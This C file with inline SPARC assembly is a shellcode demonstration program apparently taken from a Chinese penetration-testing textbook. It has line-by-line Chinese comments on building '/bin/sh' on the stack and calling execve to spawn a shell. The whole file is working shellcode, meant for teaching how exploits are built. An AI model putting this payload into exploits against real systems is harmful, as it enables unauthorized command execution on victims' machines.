/* shellcode_asm.c
*
*  《网络渗透技术》演示程序
*  作者：san, alert7, eyas, watercloud
*
*  shellcode演示
*/

int main ()
{
    __asm__
    ("
        sethi   %hi(0x2f626800), %l6
        or      %l6, 0x16e, %l6         ! 0x2f62696e
        sethi   %hi(0x2f736800), %l7
        std     %l6, [ %sp + -16 ]      ! std是指操作double word，也就是操作 %l6 + %l7 寄存器对
        add     %sp, -16, %o0           ! $o0是第一个参数，是/bin/sh字串的地址
        st      %o0, [ %sp + -8 ]       ! name数组变量指针
        clr     [ %sp + -4 ]            ! 构成了name数组变量
        add     %sp, -8, %o1            ! $o1是第二个参数，是name数组变量指针
        xor     %o2, %o2, %o2           ! $o2是第三个参数0
        mov     59, %g1                 ! execve的系统调用号是59
        ta      8
    ");
}
